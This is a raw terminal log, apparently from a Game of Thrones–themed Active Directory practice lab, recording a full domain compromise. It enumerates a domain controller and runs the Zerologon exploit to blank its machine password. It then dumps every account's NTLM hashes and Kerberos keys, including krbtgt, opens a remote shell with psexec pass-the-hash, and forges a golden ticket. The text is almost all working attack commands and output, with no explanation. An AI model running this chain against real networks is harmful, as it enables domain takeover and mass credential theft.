┌──(impacket)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ enum4linux-ng \-A \-C 192.168.20.11  
ENUM4LINUX \- next generation (v1.3.5)

 \==========================  
|    Target Information    |  
 \==========================  
\[\*\] Target ........... 192.168.20.11  
\[\*\] Username ......... ''  
\[\*\] Random Username .. 'lgjqhoyp'  
\[\*\] Password ......... ''  
\[\*\] Timeout .......... 5 second(s)

 \======================================  
|    Listener Scan on 192.168.20.11    |  
 \======================================  
\[\*\] Checking LDAP  
\[+\] LDAP is accessible on 389/tcp  
\[\*\] Checking LDAPS  
\[+\] LDAPS is accessible on 636/tcp  
\[\*\] Checking SMB  
\[+\] SMB is accessible on 445/tcp  
\[\*\] Checking SMB over NetBIOS  
\[+\] SMB over NetBIOS is accessible on 139/tcp

 \=====================================================  
|    Domain Information via LDAP for 192.168.20.11    |  
 \=====================================================  
\[\*\] Trying LDAP  
\[+\] Appears to be root/parent DC  
\[+\] Long domain name is: sevenkingdoms.local

 \============================================================  
|    NetBIOS Names and Workgroup/Domain for 192.168.20.11    |  
 \============================================================  
\[-\] Could not get NetBIOS names information via 'nmblookup': timed out

 \==========================================  
|    SMB Dialect Check on 192.168.20.11    |  
 \==========================================  
\[\*\] Trying on 445/tcp  
\[+\] Supported dialects and settings:  
Supported dialects:                                                                                                                                               
  SMB 1.0: false                                                                                                                                                  
  SMB 2.0.2: true                                                                                                                                                 
  SMB 2.1: true                                                                                                                                                   
  SMB 3.0: true                                                                                                                                                   
  SMB 3.1.1: true                                                                                                                                                 
Preferred dialect: SMB 3.0                                                                                                                                        
SMB1 only: false                                                                                                                                                  
SMB signing required: true                                                                                                                                      

 \============================================================  
|    Domain Information via SMB session for 192.168.20.11    |  
 \============================================================  
\[\*\] Enumerating via unauthenticated SMB session on 445/tcp  
\[+\] Found domain information via SMB  
NetBIOS computer name: WINTERFELL                                                                                                                                 
NetBIOS domain name: NORTH                                                                                                                                        
DNS domain: north.sevenkingdoms.local                                                                                                                             
FQDN: winterfell.north.sevenkingdoms.local                                                                                                                        
Derived membership: domain member                                                                                                                                 
Derived domain: NORTH                                                                                                                                           

 \==========================================  
|    RPC Session Check on 192.168.20.11    |  
 \==========================================  
\[\*\] Check for anonymous access (null session)  
\[+\] Server allows authentication via username '' and password ''  
\[\*\] Check for guest access  
\[-\] Could not establish guest session: STATUS\_LOGON\_FAILURE

 \====================================================  
|    Domain Information via RPC for 192.168.20.11    |  
 \====================================================  
\[+\] Domain: NORTH  
\[+\] Domain SID: S-1-5-21-2333213469-3384005324-1178089573  
\[+\] Membership: domain member

 \================================================  
|    OS Information via RPC for 192.168.20.11    |  
 \================================================  
\[\*\] Enumerating via unauthenticated SMB session on 445/tcp  
\[+\] Found OS information via SMB  
\[\*\] Enumerating via 'srvinfo'  
\[-\] Could not get OS info via 'srvinfo': STATUS\_ACCESS\_DENIED  
\[+\] After merging OS information we have the following result:  
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                          
OS version: '10.0'                                                                                                                                                
OS release: '1809'                                                                                                                                                
OS build: '17763'                                                                                                                                                 
Native OS: not supported                                                                                                                                          
Native LAN manager: not supported                                                                                                                                 
Platform id: null                                                                                                                                                 
Server type: null                                                                                                                                                 
Server type string: null                                                                                                                                        

 \======================================  
|    Users via RPC on 192.168.20.11    |  
 \======================================  
\[\*\] Enumerating users via 'querydispinfo'  
\[+\] Found 10 user(s) via 'querydispinfo'  
\[\*\] Enumerating users via 'enumdomusers'  
\[+\] Found 10 user(s) via 'enumdomusers'  
\[+\] After merging user results we have 10 user(s) total:  
'1111':                                                                                                                                                           
  username: arya.stark                                                                                                                                            
  name: (null)                                                                                                                                                    
  acb: '0x00000210'                                                                                                                                               
  description: Arya Stark                                                                                                                                         
'1115':                                                                                                                                                           
  username: sansa.stark                                                                                                                                           
  name: (null)                                                                                                                                                    
  acb: '0x00000210'                                                                                                                                               
  description: Sansa Stark                                                                                                                                        
'1116':                                                                                                                                                           
  username: brandon.stark                                                                                                                                         
  name: (null)                                                                                                                                                    
  acb: '0x00010210'                                                                                                                                               
  description: Brandon Stark                                                                                                                                      
'1117':                                                                                                                                                           
  username: rickon.stark                                                                                                                                          
  name: (null)                                                                                                                                                    
  acb: '0x00000210'                                                                                                                                               
  description: Rickon Stark                                                                                                                                       
'1118':                                                                                                                                                           
  username: hodor                                                                                                                                                 
  name: (null)                                                                                                                                                    
  acb: '0x00000210'                                                                                                                                               
  description: Brainless Giant                                                                                                                                    
'1119':                                                                                                                                                           
  username: jon.snow                                                                                                                                              
  name: (null)                                                                                                                                                    
  acb: '0x00040210'                                                                                                                                               
  description: Jon Snow                                                                                                                                           
'1120':                                                                                                                                                           
  username: samwell.tarly                                                                                                                                         
  name: (null)                                                                                                                                                    
  acb: '0x00000210'                                                                                                                                               
  description: 'Samwell Tarly (Password : Heartsbane)'                                                                                                            
'1121':                                                                                                                                                           
  username: jeor.mormont                                                                                                                                          
  name: (null)                                                                                                                                                    
  acb: '0x00000210'                                                                                                                                               
  description: Jeor Mormont                                                                                                                                       
'1122':                                                                                                                                                           
  username: sql\_svc                                                                                                                                               
  name: (null)                                                                                                                                                    
  acb: '0x00000210'                                                                                                                                               
  description: sql service                                                                                                                                        
'501':                                                                                                                                                            
  username: Guest                                                                                                                                                 
  name: (null)                                                                                                                                                    
  acb: '0x00000215'                                                                                                                                               
  description: Built-in account for guest access to the computer/domain                                                                                         

 \=======================================  
|    Groups via RPC on 192.168.20.11    |  
 \=======================================  
\[\*\] Enumerating local groups  
\[+\] Found 6 group(s) via 'enumalsgroups domain'  
\[\*\] Enumerating builtin groups  
\[+\] Found 21 group(s) via 'enumalsgroups builtin'  
\[\*\] Enumerating domain groups  
\[+\] Found 11 group(s) via 'enumdomgroups'  
\[+\] After merging groups results we have 38 group(s) total:  
'1103':                                                                                                                                                           
  groupname: DnsAdmins                                                                                                                                            
  type: local                                                                                                                                                     
'1104':                                                                                                                                                           
  groupname: DnsUpdateProxy                                                                                                                                       
  type: domain                                                                                                                                                    
'1107':                                                                                                                                                           
  groupname: Stark                                                                                                                                                
  type: domain                                                                                                                                                    
'1108':                                                                                                                                                           
  groupname: Night Watch                                                                                                                                          
  type: domain                                                                                                                                                    
'1109':                                                                                                                                                           
  groupname: Mormont                                                                                                                                              
  type: domain                                                                                                                                                    
'1110':                                                                                                                                                           
  groupname: AcrossTheSea                                                                                                                                         
  type: local                                                                                                                                                     
'513':                                                                                                                                                            
  groupname: Domain Users                                                                                                                                         
  type: domain                                                                                                                                                    
'514':                                                                                                                                                            
  groupname: Domain Guests                                                                                                                                        
  type: domain                                                                                                                                                    
'515':                                                                                                                                                            
  groupname: Domain Computers                                                                                                                                     
  type: domain                                                                                                                                                    
'517':                                                                                                                                                            
  groupname: Cert Publishers                                                                                                                                      
  type: local                                                                                                                                                     
'520':                                                                                                                                                            
  groupname: Group Policy Creator Owners                                                                                                                          
  type: domain                                                                                                                                                    
'522':                                                                                                                                                            
  groupname: Cloneable Domain Controllers                                                                                                                         
  type: domain                                                                                                                                                    
'525':                                                                                                                                                            
  groupname: Protected Users                                                                                                                                      
  type: domain                                                                                                                                                    
'526':                                                                                                                                                            
  groupname: Key Admins                                                                                                                                           
  type: domain                                                                                                                                                    
'545':                                                                                                                                                            
  groupname: Users                                                                                                                                                
  type: builtin                                                                                                                                                   
'546':                                                                                                                                                            
  groupname: Guests                                                                                                                                               
  type: builtin                                                                                                                                                   
'553':                                                                                                                                                            
  groupname: RAS and IAS Servers                                                                                                                                  
  type: local                                                                                                                                                     
'554':                                                                                                                                                            
  groupname: Pre-Windows 2000 Compatible Access                                                                                                                   
  type: builtin                                                                                                                                                   
'555':                                                                                                                                                            
  groupname: Remote Desktop Users                                                                                                                                 
  type: builtin                                                                                                                                                   
'556':                                                                                                                                                            
  groupname: Network Configuration Operators                                                                                                                      
  type: builtin                                                                                                                                                   
'558':                                                                                                                                                            
  groupname: Performance Monitor Users                                                                                                                            
  type: builtin                                                                                                                                                   
'559':                                                                                                                                                            
  groupname: Performance Log Users                                                                                                                                
  type: builtin                                                                                                                                                   
'560':                                                                                                                                                            
  groupname: Windows Authorization Access Group                                                                                                                   
  type: builtin                                                                                                                                                   
'561':                                                                                                                                                            
  groupname: Terminal Server License Servers                                                                                                                      
  type: builtin                                                                                                                                                   
'562':                                                                                                                                                            
  groupname: Distributed COM Users                                                                                                                                
  type: builtin                                                                                                                                                   
'568':                                                                                                                                                            
  groupname: IIS\_IUSRS                                                                                                                                            
  type: builtin                                                                                                                                                   
'569':                                                                                                                                                            
  groupname: Cryptographic Operators                                                                                                                              
  type: builtin                                                                                                                                                   
'571':                                                                                                                                                            
  groupname: Allowed RODC Password Replication Group                                                                                                              
  type: local                                                                                                                                                     
'572':                                                                                                                                                            
  groupname: Denied RODC Password Replication Group                                                                                                               
  type: local                                                                                                                                                     
'573':                                                                                                                                                            
  groupname: Event Log Readers                                                                                                                                    
  type: builtin                                                                                                                                                   
'574':                                                                                                                                                            
  groupname: Certificate Service DCOM Access                                                                                                                      
  type: builtin                                                                                                                                                   
'575':                                                                                                                                                            
  groupname: RDS Remote Access Servers                                                                                                                            
  type: builtin                                                                                                                                                   
'576':                                                                                                                                                            
  groupname: RDS Endpoint Servers                                                                                                                                 
  type: builtin                                                                                                                                                   
'577':                                                                                                                                                            
  groupname: RDS Management Servers                                                                                                                               
  type: builtin                                                                                                                                                   
'578':                                                                                                                                                            
  groupname: Hyper-V Administrators                                                                                                                               
  type: builtin                                                                                                                                                   
'579':                                                                                                                                                            
  groupname: Access Control Assistance Operators                                                                                                                  
  type: builtin                                                                                                                                                   
'580':                                                                                                                                                            
  groupname: Remote Management Users                                                                                                                              
  type: builtin                                                                                                                                                   
'582':                                                                                                                                                            
  groupname: Storage Replica Administrators                                                                                                                       
  type: builtin                                                                                                                                                 

 \=========================================  
|    Services via RPC on 192.168.20.11    |  
 \=========================================  
\[-\] Could not get RPC services via 'net rpc service list': STATUS\_ACCESS\_DENIED

 \=======================================  
|    Shares via RPC on 192.168.20.11    |  
 \=======================================

^C  
\[\!\] Received SIGINT, aborting enumeration

Completed after 984.33 seconds  
                                                                                                                                                                  
┌──(impacket)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ secretsdump.py WINTERFELL$@192.168.20.11  
/home/kali/.venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html. The pkg\_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\<81.  
  import pkg\_resources  
Impacket v0.13.0.dev0+20250813.95021.3e63dae \- Copyright Fortra, LLC and its affiliated companies 

\[-\] RemoteOperations failed: \[Errno Connection error (WINTERFELL192.168.20.11:445)\] \[Errno \-2\] Name or service not known  
\[\*\] Cleaning up... 

[https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)

┌──(kali㉿kali)-\[\~/goAD-lab/adPEAS/adPEAS/CVE-2020-1472\]  
└─$ python3 cve-2020-1472-exploit.py \--target-ip 192.168.20.11 \--dc-name WINTERFELL

Usage: zerologon\_tester.py \<dc-name\> \<dc-ip\>

Tests whether a domain controller is vulnerable to the Zerologon attack. Resets the DC account password to an empty string when vulnerable.  
Note: dc-name should be the (NetBIOS) computer name of the domain controller.  
                                                                                                                                                                  
┌──(kali㉿kali)-\[\~/goAD-lab/adPEAS/adPEAS/CVE-2020-1472\]  
└─$ python3 cve-2020-1472-exploit.py \-h                                              
Usage: zerologon\_tester.py \<dc-name\> \<dc-ip\>

Tests whether a domain controller is vulnerable to the Zerologon attack. Resets the DC account password to an empty string when vulnerable.  
Note: dc-name should be the (NetBIOS) computer name of the domain controller.  
                                                                                                                                                                  
┌──(kali㉿kali)-\[\~/goAD-lab/adPEAS/adPEAS/CVE-2020-1472\]  
└─$ python3 cve-2020-1472-exploit.py WINTERFELL 192.168.20.11  
Performing authentication attempts...

Target vulnerable, changing account password to empty string

Result: 0

Exploit complete\!

┌──(impacket)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ secretsdump.py WINTERFELL$@192.168.20.11  
/home/kali/.venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html. The pkg\_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\<81.  
  import pkg\_resources  
Impacket v0.13.0.dev0+20250813.95021.3e63dae \- Copyright Fortra, LLC and its affiliated companies 

\[-\] RemoteOperations failed: \[Errno Connection error (WINTERFELL192.168.20.11:445)\] \[Errno \-2\] Name or service not known  
\[\*\] Cleaning up...   
                                                                                                                                                                  
┌──(impacket)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ secretsdump.py WINTERFELL\\$@192.168.20.11  
/home/kali/.venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html. The pkg\_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\<81.  
  import pkg\_resources  
Impacket v0.13.0.dev0+20250813.95021.3e63dae \- Copyright Fortra, LLC and its affiliated companies 

Password:  
\[-\] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 \- rpc\_s\_access\_denied   
\[\*\] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)  
\[\*\] Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8ee4574a2323989e64eb21418a2e69ae:::  
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::  
cloudbase-init:1001:aad3b435b51404eeaad3b435b51404ee:d2232f12b7ddb5e8fa39d37b6ee86ad3:::  
arya.stark:1111:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::  
eddard.stark:1112:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::  
catelyn.stark:1113:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::  
robb.stark:1114:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::  
sansa.stark:1115:aad3b435b51404eeaad3b435b51404ee:b777555c2e2e3716e075cc255b26c14d:::  
brandon.stark:1116:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::  
rickon.stark:1117:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::  
hodor:1118:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::  
jon.snow:1119:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::  
samwell.tarly:1120:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::  
jeor.mormont:1121:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::  
sql\_svc:1122:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::  
WINTERFELL$:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
CASTELBLACK$:1105:aad3b435b51404eeaad3b435b51404ee:e2760f0bbc8b223411a90b31ab42a326:::  
SEVENKINGDOMS$:1106:aad3b435b51404eeaad3b435b51404ee:afcbbdf34c3eb936725b964134bedf68:::  
\[\*\] Kerberos keys grabbed  
Administrator:aes256-cts-hmac-sha1-96:ec9ad6fa2d84fd4515a8636116b93a79f970b01b938e701263a18346d57c8d18  
Administrator:aes128-cts-hmac-sha1-96:628fa331fbcbe93204b40b881a94ae12  
Administrator:des-cbc-md5:6bb9c8e083bfb6ea  
krbtgt:aes256-cts-hmac-sha1-96:0296f1379c4a14fa41d3599a91c6e1b05bc7e4b8e7ba37264c9aa7da79e47b3c  
krbtgt:aes128-cts-hmac-sha1-96:ff81ffbcb2d022b8edc8a572f3b132f7  
krbtgt:des-cbc-md5:d5fb85e06d796d08  
vagrant:aes256-cts-hmac-sha1-96:aa97635c942315178db04791ffa240411c36963b5a5e775e785c6bd21dd11c24  
vagrant:aes128-cts-hmac-sha1-96:0d7c6160ffb016857b9af96c44110ab1  
vagrant:des-cbc-md5:16dc9e8ad3dfc47f  
cloudbase-init:aes256-cts-hmac-sha1-96:dd05ca8aa80ee7304073f36539bb44b52dcc45c904590a7cd86c56081a30f26c  
cloudbase-init:aes128-cts-hmac-sha1-96:bf435f8baed1120d416f3da13007baf8  
cloudbase-init:des-cbc-md5:7cda01e0cee39401  
arya.stark:aes256-cts-hmac-sha1-96:2001e8fb3da02f3be6945b4cce16e6abdd304974615d6feca7d135d4009d4f7d  
arya.stark:aes128-cts-hmac-sha1-96:8477cba28e7d7cfe5338d172a23d74df  
arya.stark:des-cbc-md5:13525243d6643285  
eddard.stark:aes256-cts-hmac-sha1-96:f6b4d01107eb34c0ecb5f07d804fa9959dce6643f8e4688df17623b847ec7fc4  
eddard.stark:aes128-cts-hmac-sha1-96:5f9b06a24b90862367ec221a11f92203  
eddard.stark:des-cbc-md5:8067f7abecc7d346  
catelyn.stark:aes256-cts-hmac-sha1-96:c8302e270b04252251de40b2bd5fba37395b55d5ed9ac95e03213dc739827283  
catelyn.stark:aes128-cts-hmac-sha1-96:50ce7e2ad069fa40fb2bc7f5f9643d93  
catelyn.stark:des-cbc-md5:6b314670a2f84cfb  
robb.stark:aes256-cts-hmac-sha1-96:d7df5069178bbc93fdc34bbbcb8e374fd75c44d6ce51000f24688925cc4d9c2a  
robb.stark:aes128-cts-hmac-sha1-96:b2965905e68356d63fedd9904357cc42  
robb.stark:des-cbc-md5:c4b62c797f5dd01f  
sansa.stark:aes256-cts-hmac-sha1-96:a268e7a385f4f165c6489c18a3bdeb52c5e505050449c6f9aeba4bc06a7fcbed  
sansa.stark:aes128-cts-hmac-sha1-96:e2e6e885f6f4d3e25d759ea624961392  
sansa.stark:des-cbc-md5:4c7c16e3f74cc4d3  
brandon.stark:aes256-cts-hmac-sha1-96:6dd181186b68898376d3236662f8aeb8fa68e4b5880744034d293d18b6753b10  
brandon.stark:aes128-cts-hmac-sha1-96:9de3581a163bd056073b71ab23142d73  
brandon.stark:des-cbc-md5:76e61fda8a4f5245  
rickon.stark:aes256-cts-hmac-sha1-96:79ffda34e5b23584b3bd67c887629815bb9ab8a1952ae9fda15511996587dcda  
rickon.stark:aes128-cts-hmac-sha1-96:d4a0669b1eff6caa42f2632ebca8cd8d  
rickon.stark:des-cbc-md5:b9ec3b8f2fd9d98a  
hodor:aes256-cts-hmac-sha1-96:a33579ec769f3d6477a98e72102a7f8964f09a745c1191a705d8e1c3ab6e4287  
hodor:aes128-cts-hmac-sha1-96:929126dcca8c698230b5787e8f5a5b60  
hodor:des-cbc-md5:d5764373f2545dfd  
jon.snow:aes256-cts-hmac-sha1-96:5a1bc13364e758131f87a1f37d2f1b1fa8aa7a4be10e3fe5a69e80a5c4c408fb  
jon.snow:aes128-cts-hmac-sha1-96:d8bc99ccfebe2d6e97d15f147aa50e8b  
jon.snow:des-cbc-md5:084358ceb3290d7c  
samwell.tarly:aes256-cts-hmac-sha1-96:b66738c4d2391b0602871d0a5cd1f9add8ff6b91dcbb7bc325dc76986496c605  
samwell.tarly:aes128-cts-hmac-sha1-96:3943b4ac630b0294d5a4e8b940101fae  
samwell.tarly:des-cbc-md5:5efed0e0a45dd951  
jeor.mormont:aes256-cts-hmac-sha1-96:be10f893afa35457fcf61ecc40dc032399b7aee77c87bb71dd2fe91411d2bd50  
jeor.mormont:aes128-cts-hmac-sha1-96:1b0a98958e19d6092c8e8dc1d25c788b  
jeor.mormont:des-cbc-md5:1a68641a3e9bb6ea  
sql\_svc:aes256-cts-hmac-sha1-96:24d57467625d5510d6acfddf776264db60a40c934fcf518eacd7916936b1d6af  
sql\_svc:aes128-cts-hmac-sha1-96:01290f5b76c04e39fb2cb58330a22029  
sql\_svc:des-cbc-md5:8645d5cd402f16c7  
WINTERFELL$:aes256-cts-hmac-sha1-96:a94fab2e57945694cec8feee66e8b49844a7c780e928d2e1bfd0d95a3c36998d  
WINTERFELL$:aes128-cts-hmac-sha1-96:b52e9d2953088173909fc9719b775b95  
WINTERFELL$:des-cbc-md5:c7fed6fd46313bae  
CASTELBLACK$:aes256-cts-hmac-sha1-96:13b8c941f55f81f1815ecff6926c964820cb6c97c83a8d5c06fc827ccb22b13e  
CASTELBLACK$:aes128-cts-hmac-sha1-96:aaac77936fa36f165954c598aec53e6b  
CASTELBLACK$:des-cbc-md5:6d0d0b1c2c3d6e64  
SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:e723e105bd7d955756e93322d8dba2d9eb33ca6a75b18886b26ad5cc17efe11a  
SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:58ae894dbe02eba84aba3849d9933ce2  
SEVENKINGDOMS$:des-cbc-md5:efb93b26467f19a8  
\[\*\] Cleaning up... 

──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ psexec.py north.sevenkingdoms.local/Administrator@192.168.20.22 \-hashes aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4  
/home/kali/.venvs/cme/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html. The pkg\_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\<81.  
  import pkg\_resources  
Impacket v0.12.0 \- Copyright Fortra, LLC and its affiliated companies 

\[\*\] Requesting shares on 192.168.20.22.....  
\[\*\] Found writable share ADMIN$  
\[\*\] Uploading file jOJFBygB.exe  
\[\*\] Opening SVCManager on 192.168.20.22.....  
\[\*\] Creating service qnuB on 192.168.20.22.....  
\[\*\] Starting service qnuB.....  
\[\!\] Press help for extra shell commands  
Microsoft Windows \[Version 10.0.17763.737\]  
(c) 2018 Microsoft Corporation. All rights reserved.  
\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#

                                                Golden Ticket etc…

┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ rm north.sevenkingdoms.local.ccache  
rm: cannot remove 'north.sevenkingdoms.local.ccache': No such file or directory  
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ ls  
20250827171105\_computers.json   20250827173112\_Certipy.json     20250828161826\_domains.json  meterpreter.exe  
20250827171105\_containers.json  20250827173112\_Certipy.txt      20250828161826\_gpos.json     mimikatz\_192.168.20.23.txt  
20250827171105\_domains.json     20250827173112\_Certipy.zip      20250828161826\_groups.json   naabu\_ad\_ports.txt  
20250827171105\_gpos.json        20250827210949\_computers.json   20250828161826\_ous.json      NetExec  
20250827171105\_groups.json      20250827210949\_containers.json  20250828161826\_users.json    noPac  
20250827171105\_ous.json         20250827210949\_domains.json     20250828161834\_Certipy.json  nuclei\_ad\_scan.txt  
20250827171105\_users.json       20250827210949\_gpos.json        20250828161834\_Certipy.txt   nuclei\_ai\_ad.txt  
20250827171113\_Certipy.json     20250827210949\_groups.json      20250828161834\_Certipy.zip   nuclei\_ai\_mssql.txt  
20250827171113\_Certipy.txt      20250827210949\_ous.json         adPEAS                       nuclei\_core\_high.txt  
20250827171113\_Certipy.zip      20250827210949\_users.json       arya.txt                     nuclei\_iis\_scan.txt  
20250827171724\_computers.json   20250827211000\_Certipy.json     asrep\_hashes.txt             passwords.txt  
20250827171724\_containers.json  20250827211000\_Certipy.txt      Certipy                      pwn.ps1  
20250827171724\_domains.json     20250827211000\_Certipy.zip      certipy-env                  script.ps1  
20250827171724\_gpos.json        20250828092950\_computers.json   cme\_results.txt              secret.ps1  
20250827171724\_groups.json      20250828092950\_containers.json  connys\_textdatei.txt         secretsdump\_results.txt  
20250827171724\_ous.json         20250828092950\_domains.json     decrypt.ps1                  shares\_results.txt  
20250827171724\_users.json       20250828092950\_gpos.json        encryption.key               spider\_results.txt  
20250827171730\_Certipy.json     20250828092950\_groups.json      encrypt.ps1                  targets.txt  
20250827171730\_Certipy.txt      20250828092950\_ous.json         ext-pos-cme.py               Test.txt  
20250827171730\_Certipy.zip      20250828092950\_users.json       fast\_tcp\_scan.gnmap          users.txt  
20250827173104\_computers.json   20250828093002\_Certipy.json     fast\_tcp\_scan.nmap           user.txt  
20250827173104\_containers.json  20250828093002\_Certipy.txt      fast\_tcp\_scan.xml            valid\_creds.txt  
20250827173104\_domains.json     20250828093002\_Certipy.zip      fix-2.sh                     winPEASx64.exe  
20250827173104\_gpos.json        20250828161055\_bloodhound       fix.sh                       WINTERFELL.north.sevenkingdoms.local.ccache  
20250827173104\_groups.json      20250828161055\_bloodhound.zip   hosts.txt  
20250827173104\_ous.json         20250828161826\_computers.json   kerberoast.txt  
20250827173104\_users.json       20250828161826\_containers.json  lab02.ovpn  
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ rm WINTERFELL.north.sevenkingdoms.local.ccache                                                      
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ ticketer.py \-nthash 8ee4574a2323989e64eb21418a2e69ae \-domain north.sevenkingdoms.local \-domain-sid S-1-5-21-2333213469-3384005324-1178089573 \-user Administrator WINTERFELL.north.sevenkingdoms.local  
/home/kali/.venvs/cme/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html. The pkg\_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\<81.  
  import pkg\_resources  
Impacket v0.12.0 \- Copyright Fortra, LLC and its affiliated companies 

\[\*\] Creating basic skeleton ticket and PAC Infos  
/home/kali/.venvs/cme/bin/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).  
  aTime \= timegm(datetime.datetime.utcnow().timetuple())  
\[\*\] Customizing ticket for north.sevenkingdoms.local/WINTERFELL.north.sevenkingdoms.local  
/home/kali/.venvs/cme/bin/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).  
  ticketDuration \= datetime.datetime.utcnow() \+ datetime.timedelta(hours=int(self.\_\_options.duration))  
/home/kali/.venvs/cme/bin/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).  
  encTicketPart\['authtime'\] \= KerberosTime.to\_asn1(datetime.datetime.utcnow())  
/home/kali/.venvs/cme/bin/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).  
  encTicketPart\['starttime'\] \= KerberosTime.to\_asn1(datetime.datetime.utcnow())  
\[\*\]     PAC\_LOGON\_INFO  
\[\*\]     PAC\_CLIENT\_INFO\_TYPE  
\[\*\]     EncTicketPart  
/home/kali/.venvs/cme/bin/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).  
  encRepPart\['last-req'\]\[0\]\['lr-value'\] \= KerberosTime.to\_asn1(datetime.datetime.utcnow())  
\[\*\]     EncAsRepPart  
\[\*\] Signing/Encrypting final ticket  
\[\*\]     PAC\_SERVER\_CHECKSUM  
\[\*\]     PAC\_PRIVSVR\_CHECKSUM  
\[\*\]     EncTicketPart  
\[\*\]     EncASRepPart  
\[\*\] Saving ticket in WINTERFELL.north.sevenkingdoms.local.ccache  
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ export KRB5CCNAME=$(pwd)/north.sevenkingdoms.local.ccache  
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ psexec.py \-k \-no-pass north.sevenkingdoms.local/Administrator@WINTERFELL.north.sevenkingdoms.local  
/home/kali/.venvs/cme/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html. The pkg\_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\<81.  
  import pkg\_resources  
Impacket v0.12.0 \- Copyright Fortra, LLC and its affiliated companies 

\[-\] \[Errno 2\] No such file or directory: '/home/kali/goAD-lab/north.sevenkingdoms.local.ccache'  
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ host WINTERFELL.north.sevenkingdoms.local  
;; communications error to 127.0.0.1\#53: connection refused  
;; communications error to 127.0.0.1\#53: connection refused  
Host WINTERFELL.north.sevenkingdoms.local not found: 3(NXDOMAIN)  
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
